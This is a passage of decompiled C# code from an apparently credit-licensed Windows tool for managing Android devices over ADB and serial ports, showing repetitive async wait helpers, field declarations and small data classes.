		private async Task<string> <button9_Click>g__GetWaitForDevicesResultAsync|78_0()
		{
			await this.WaitForDevices();
			return "";
		}

		// Token: 0x06000142 RID: 322 RVA: 0x00010CE4 File Offset: 0x0000EEE4
		[CompilerGenerated]
		private async Task<string> <button32_Click>g__GetWaitForDevicesResultAsync|104_0()
		{
			await this.WaitForDevices();
			return "";
		}

		// Token: 0x06000143 RID: 323 RVA: 0x00010D28 File Offset: 0x0000EF28
		[CompilerGenerated]
		private async Task<string> <button34_Click>g__GetWaitForDevicesResultAsync|108_0()
		{
			await this.WaitForDevices();
			return "";
		}

		// Token: 0x06000144 RID: 324 RVA: 0x00010D6C File Offset: 0x0000EF6C
		[CompilerGenerated]
		private async Task<string> <button37_Click>g__GetWaitForDevicesResultAsync|112_0()
		{
			await this.WaitForDevices();
			return "";
		}

		// Token: 0x06000149 RID: 329 RVA: 0x00010DF0 File Offset: 0x0000EFF0
		[CompilerGenerated]
		private async Task<string> <button12_Click_1>g__GetWaitForDevicesResultAsync|119_4()
		{
			await this.WaitForDevices();
			return "";
		}

		// Token: 0x0600014B RID: 331 RVA: 0x00010E34 File Offset: 0x0000F034
		[CompilerGenerated]
		private async Task<string> <button41_Click>g__GetWaitForDevicesResultAsync|120_1()
		{
			await this.WaitForDevices();
			return "";
		}

		// Token: 0x0600014C RID: 332 RVA: 0x00010E78 File Offset: 0x0000F078
		[CompilerGenerated]
		private async Task<string> <button42_Click>g__GetWaitForDevicesResultAsync|121_0()
		{
			await this.WaitForDevices();
			return "";
		}

		// Token: 0x0600014D RID: 333 RVA: 0x00010EBC File Offset: 0x0000F0BC
		[CompilerGenerated]
		private async Task<string> <button43_Click>g__GetWaitForDevicesResultAsync|123_0()
		{
			await this.WaitForDevices();
			return "";
		}

		// Token: 0x0600014E RID: 334 RVA: 0x00010F00 File Offset: 0x0000F100
		[CompilerGenerated]
		private async Task<string> <button44_Click>g__GetWaitForDevicesResultAsync|127_0()
		{
			await this.WaitForDevices();
			return "";
		}

		// Token: 0x040000B4 RID: 180
		private WebClient webClient;

		// Token: 0x040000B5 RID: 181
		private global::System.Windows.Forms.Timer timer;

		// Token: 0x040000B6 RID: 182
		private Stopwatch stopwatch;

		// Token: 0x040000B7 RID: 183
		private Color originalTextColor;

		// Token: 0x040000B8 RID: 184
		private Font originalFont;

		// Token: 0x040000B9 RID: 185
		private long totalBytes;

		// Token: 0x040000BA RID: 186
		private long bytesReceived;

		// Token: 0x040000BB RID: 187
		private string apkFolderPath;

		// Token: 0x040000BC RID: 188
		private Process scrcpyProcess;

		// Token: 0x040000BD RID: 189
		private SerialPort serialPort;

		// Token: 0x040000BE RID: 190
		private bool adbPortFound = false;

		// Token: 0x040000BF RID: 191
		public AdbClient adbclients = new AdbClient(-1, null);

		// Token: 0x040000C0 RID: 192
		public string SnAdb;

		// Token: 0x040000C1 RID: 193
		public bool busyState;

		// Token: 0x040000C2 RID: 194
		private static SerialPort _serialPort;

		// Token: 0x040000C3 RID: 195
		private const string vidPattern = "VID_([0-9A-F]{4})";

		// Token: 0x040000C4 RID: 196
		private const string pidPattern = "PID_([0-9A-F]{4})";

		// Token: 0x02000028 RID: 40
		public class ComPort
		{
			// Token: 0x17000017 RID: 23
			// (get) Token: 0x0600014F RID: 335 RVA: 0x00010F44 File Offset: 0x0000F144
			// (set) Token: 0x06000150 RID: 336 RVA: 0x00010F58 File Offset: 0x0000F158
			public string Description { get; set; }

			// Token: 0x17000018 RID: 24
			// (get) Token: 0x06000151 RID: 337 RVA: 0x00010F6C File Offset: 0x0000F16C
			public string DisplayName
			{
				get
				{
					return this.Description + " (" + this.Name + ")";
				}
			}

			// Token: 0x17000019 RID: 25
			// (get) Token: 0x06000152 RID: 338 RVA: 0x00010F98 File Offset: 0x0000F198
			// (set) Token: 0x06000153 RID: 339 RVA: 0x00010FAC File Offset: 0x0000F1AC
			public string Name { get; set; }

			// Token: 0x1700001A RID: 26
			// (get) Token: 0x06000154 RID: 340 RVA: 0x00010FC0 File Offset: 0x0000F1C0
			// (set) Token: 0x06000155 RID: 341 RVA: 0x00010FD4 File Offset: 0x0000F1D4
			public string Pid { get; set; }

			// Token: 0x1700001B RID: 27
			// (get) Token: 0x06000156 RID: 342 RVA: 0x00010FE8 File Offset: 0x0000F1E8
			// (set) Token: 0x06000157 RID: 343 RVA: 0x00010FFC File Offset: 0x0000F1FC
			public string Vid { get; set; }
		}

		// Token: 0x02000029 RID: 41
		public class ApiResponse
		{
			// Token: 0x1700001C RID: 28
			// (get) Token: 0x06000159 RID: 345 RVA: 0x00011010 File Offset: 0x0000F210
			// (set) Token: 0x0600015A RID: 346 RVA: 0x00011024 File Offset: 0x0000F224
			[JsonProperty("expiry_date")]
			public string ExpiryDate { get; set; }

			// Token: 0x1700001D RID: 29
			// (get) Token: 0x0600015B RID: 347 RVA: 0x00011038 File Offset: 0x0000F238
			// (set) Token: 0x0600015C RID: 348 RVA: 0x0001104C File Offset: 0x0000F24C
			[JsonProperty("credits")]
			public int Credits { get; set; }
		}
	}
}
